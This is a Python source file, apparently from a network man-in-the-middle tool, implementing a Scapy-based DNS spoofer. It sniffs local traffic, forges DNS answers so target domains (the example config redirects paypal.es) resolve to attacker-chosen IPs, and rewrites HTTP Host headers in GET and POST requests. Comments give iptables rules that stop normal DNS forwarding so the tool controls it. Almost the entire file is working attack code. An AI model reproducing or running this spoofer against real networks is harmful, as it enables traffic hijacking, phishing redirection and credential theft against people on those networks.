import threading
from scapy.all import *

from src import files, packet_utilities
from src.log import log




class DNS_Spoofer(threading.Thread):
    #Thread that gets every DNS packet and answers or forwards it. If the domain is one of the targets,
    #it answers the DNS query with the desired IP. If not, it simply forwards it.
    #IP Forwarding must be deactivated in port 53, because this thread is the one which forwards or not those packets.
    
    def __init__(self, exit_event, file_loc, timeout):
        super().__init__()
        self.exit_event = exit_event
        self.timeout = timeout
        self.handled_http_packets = []
        
        parsed_redirects = files.parse_domains_and_ips(file_loc)
        self.parsed_redirects, self.default = self.resolve_parsed_redirects(parsed_redirects)
        
        #FILE
        #* example.com
        #paypal.es pokexperto.net
        #padventures.org 192.168.191.120
   
        #parsed_redirects=                  {"paypal.es": ["45.60.23.55", "pokexperto.net"], "padventures.org": ["192.168.191.120", None]}
        #default=                           ["93.184.216.34", "example.com"]
        
    
    def resolve_parsed_redirects(self, redirects):
        #FILE
        #* example.com
        #paypal.es pokexperto.net
        #padventures.org 192.168.191.120
        
        #Parsed=                    {"*": "example.com", "paypal.es":"pokexperto.net", "padventures.org": "192.168.191.120"}
        
        #Redirect before default=   {"*": ["93.184.216.34", "example.com"], "paypal.es": ["45.60.23.55", "pokexperto.net"], "padventures.org": ["192.168.191.120", None]}
        
        #Redirect=                  {"paypal.es": ["45.60.23.55", "pokexperto.net"], "padventures.org": ["192.168.191.120", None]}
        #Default=                   ["93.184.216.34", "example.com"]
        
        
        new_redirects = {}
        
        for domain, supposed_ip in redirects.items():
            if supposed_ip == "*":
                new_redirects[domain] = ["*",  "*"]
                continue
            
            if not packet_utilities.is_it_an_ip(supposed_ip): #supposed_ip is actually a domain
                log.dns.info("resolve1", supposed_ip=supposed_ip)
                true_ip = packet_utilities.nslookup(supposed_ip)
                
                if true_ip: log.dns.info("resolve2", supposed_ip=supposed_ip, true_ip=true_ip)
                else: log.dns.error("resolve", supposed_ip=supposed_ip)
                
                redirect = [true_ip, supposed_ip]
            else:
                redirect = [supposed_ip, None]
            
            new_redirects[domain] = redirect.copy()
            
        default = new_redirects.pop("*", [None,None]) #si hay un default, lo quita y lo devuelve. si no, devuelve [None, None]
        
        return new_redirects, default

            
    def get_redirect_for_domain(self, domain_queried):
        #Decides if a DNS Query or HTTP GET packet should be answered or just forwarded, 
        #depending on wether the domain asked is one of the targets or not. If it should 
        #be answered, it returns [IP_redirect, domain_redirect] the domain should be redirected 
        #to. Note that domain_redirect can be None. If it should not be answered, it returns False.
        
        for d in self.parsed_redirects.keys(): #if it is an specific rule, it looks for it
            if d in domain_queried:
                if self.parsed_redirects[d][0] == "*": #if the IP is *, it won't be redirected
                    return [None, None]
                else:
                    return self.parsed_redirects[d]
                
        #if it is not a rule, then the default value is returned
        #this default value can be [None, None]
        return self.default        
    
    
    
    def has_packet_been_handled(self, ack, seq, has_raw):
        result = self.handled_http_packets.count([ack,seq,has_raw])
        
        return True if result > 0 else False

    
    def forward_http_packet(self, packet):
        #print("forwarding get packet")
        p = IP(dst=packet["IP"].dst, src=packet["IP"].src)/ \
            TCP(dport=packet["TCP"].dport, sport=packet["TCP"].sport, ack=packet["TCP"].ack, seq=packet["TCP"].seq, flags=packet["TCP"].flags)/ \
            Raw(load=packet.load)
            
        send(p, verbose=0)
    
    
    def forward_spoofed_http_packet(self, packet, host, spoofed_host):
        p = IP(dst=packet["IP"].dst, src=packet["IP"].src)/ \
            TCP(dport=packet["TCP"].dport, sport=packet["TCP"].sport, ack=packet["TCP"].ack, seq=packet["TCP"].seq, flags=packet["TCP"].flags)/ \
            Raw(load=packet.load.replace(host.encode("utf-8"), spoofed_host.encode("utf-8")))
        
        #ORIGINAL ACK: 620
        #MY ACK: 622
        
        if len(p.load) > len(packet.load):
            diff1 = (packet["TCP"].seq + len(packet.load) - (p["TCP"].seq + len(p.load)))
            
            # ~ #SOL 1
            
            # ~ p["TCP"].seq -= (len(p.load)-len(packet.load))
            # ~ self.handled_http_packets.append([p["TCP"].ack, p["TCP"].seq, p.haslayer("Raw")])
            
            # ~ diff = (packet["TCP"].seq + len(packet.load) - (p["TCP"].seq + len(p.load)))
            # ~ print("Performing solution 1, difference is now", diff)
            # ~ #SI BAJO EL SEQ DEL GET PARA QUE EL ACKN DEL ACK SEA CORRECTO, DEVUELVE 400 BAD REQUEST
        
            # ~ #SOL 2
            # ~ p.load = p.load[:-(len(p.load)-len(packet.load))]
            # ~ diff = (packet["TCP"].seq + len(packet.load) - (p["TCP"].seq + len(p.load)))
            # ~ print("Performing solution 2, difference is now", diff)
            
            #SOL 3
            agent = p.load[p.load.find(b"User-Agent: ")+12:p.load.find(b"\r\n", p.load.find(b"User-Agent:"))]

            first_pos = p.load.find(b"User-Agent: ")+12
            agent = p.load[first_pos:p.load.find(b"\r\n", first_pos)]
            #new_agent = b"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
            p.load = p.load.replace(agent, b"")
            
            diff2 = (packet["TCP"].seq + len(packet.load) - (p["TCP"].seq + len(p.load)))
            if diff2 < 0:
                log.dns.error("len", diff1=diff1, diff2=diff2)
        send(p, verbose=0)
    
    def add_handled_packet(self, packet):
        self.handled_http_packets.append([packet.ack, packet.seq, packet.haslayer("Raw")])
        #print(len(self.handled_http_packets))
        if len(self.handled_http_packets) > 500:
            self.handled_http_packets = self.handled_http_packets[480:]
            print("DNS handled http packets length exceeded 500. Cleaning to last 20...")
        
        
    def handle_http_get_packet(self, packet):
        try:
            a = packet.ack
        except AttributeError:
            packet.show()
        if not self.has_packet_been_handled(packet.ack, packet.seq, packet.haslayer("Raw")):
            self.add_handled_packet(packet)
            
            first_pos = packet.load.find(b"Host: ")+6
            host = packet.load[first_pos:packet.load.find(b"\r\n",first_pos)].decode("utf-8", "ignore")
            
            spoofed_domain = self.get_redirect_for_domain(host)[1]
            
            if spoofed_domain: #si el host pedido tiene una redireccion a otro dominio:
                self.forward_spoofed_http_packet(packet, host, spoofed_domain)
                log.dns.info("http_request", host=host, spoofed_domain=spoofed_domain)
                
            else:
                #si no hay una ip asociada, o no hay un dominio asociada a esta ip,
                self.forward_http_packet(packet)
        
    
    def answer_dns_packet(self, packet, ip_redirect):
        #Answers a DNS Query with the ip_redirect.
        
        # ~ answer = Ether(dst=packet["Ether"].src, src=packet["Ether"].dst, type=0x800)/ \
        answer = IP(id=0,src=packet["IP"].dst, dst=packet["IP"].src, flags="DF")/ \
        UDP(sport=53, dport=packet["UDP"].sport)/ \
        DNS(id = packet["DNS"].id, aa=1, qr=1, ra=1, ancount=1, ar=packet["DNS"].ar, qd=packet["DNS"].qd, \
        an=DNSRR(rrname=packet["DNS"].qd.qname, rdata=ip_redirect, ttl=1047)) / Raw(load="KISS")
        
        send(answer, verbose=0)
        
        
        # ~ print(packet.summary())
        # ~ print(answer.summary())
        # ~ packet.show()
        # ~ answer.show2()
    
    
    def forward_dns_packet(self, packet): 
        #Forwards a DNS Packet.
        
        pkt_redirect = IP(src=packet["IP"].src, dst=packet["IP"].dst)/ \
        UDP(sport=packet["UDP"].sport, dport=packet["UDP"].dport)/ \
        packet.getlayer("DNS")/Raw(load="KISS")
        #DNS Is the last layer, there are no more layers inside it, so i can do that.

            
        send(pkt_redirect, verbose=0)


    
    def handle_dns_packet(self, packet):
        #Answers DNS Queries that asks for one of the target domains, and forwards every other DNS Packet.
        
        #sudo iptables -A FORWARD -p udp --dport 53 -j DROP para que no haga forward del puerto 53
        #sudo iptables -A INPUT -p udp --dport 53 -j DROP en mi pc
        
        
        if packet["DNS"].rcode != 0 or (packet.haslayer("Raw") and b"KISS" in packet.load): #si ha dado error, o es uno de mis paquetes, pafuera
            return
            
        
        if not packet["DNS"].an: #si es un query (no lleva respuesta)
            domain_queried = packet["DNS"].qd.qname.decode("utf-8", "ignore")
            ip_redirect = self.get_redirect_for_domain(domain_queried)[0]
            if ip_redirect:
                log.dns.info("dns_query", domain_queried = domain_queried, ip_redirect = ip_redirect)
                self.answer_dns_packet(packet, ip_redirect)
            else:
                #no hacer forward a un paquete al que ya se le hizo forward
                # ~ print("[DNS] DNS packet domain", domain_queried, "from", packet["IP"].src, "to", packet["IP"].dst, end="")
                # ~ print("Type: answer. Forwarding...") if packet["DNS"].an else print("Type: query. Forwarding...")

                self.forward_dns_packet(packet)
            
            
    def handle_packet(self, packet):
        #if not self.has_packet_been_handled(packet.ack, packet.seq, packet.haslayer("Raw")):
        if packet.haslayer("DNS"): #paquetes DNS
            self.handle_dns_packet(packet)
        elif packet.haslayer("Raw"):# and b"GET" in packet["Raw"].load:
            self.handle_http_get_packet(packet)
        
            
            
    def run(self):
        
        log.dns.info("start",timeout=self.timeout)
        
        try:
            #SNIFF, al tener stopperTimeout y stopper, no es la funcion original de Scapy, sino una modificada por mi
        #ya que la original no tenía manera de pararse cuando se quisiera. más informacion en sendrecv de Scapy
        #lo malo de esto es que para de sniffear cada stopperTimeout segundos para comprobar si stopper devuelve True,
        #con lo que puede perder algun paquete en ese proceso (cuando escribo esto aun no se ha dado el caso)
        
        #          es un paquete DNS y es IP (hay algunos que son ICMP host redirect) o bien es tcp, y en la capa raw tiene GET o POST
            sniff(filter="udp or tcp",
                  lfilter = lambda x: ((x.haslayer("DNS") and x.haslayer("IP")) or (x.haslayer("TCP") and x.haslayer("Raw") and ((b"POST" in x["Raw"].load) or (b"GET" in x["Raw"].load)))),
                  prn=self.handle_packet, store=False, timeout=self.timeout, stopperTimeout=3, stopper=self.exit_event.is_set)
                  
            #sniff(filter="tcp", lfilter = lambda x: x.haslayer("Raw") and b"GET" in x["Raw"].load, prn=self.handle_dns_packet, store=False, timeout=self.timeout, stopperTimeout=3, stopper=self.exit_event.is_set)
        except PermissionError as err:
            log.dns.error("permission_sniffing", err = err)
            
        log.dns.info("finish")
        
        
        


        

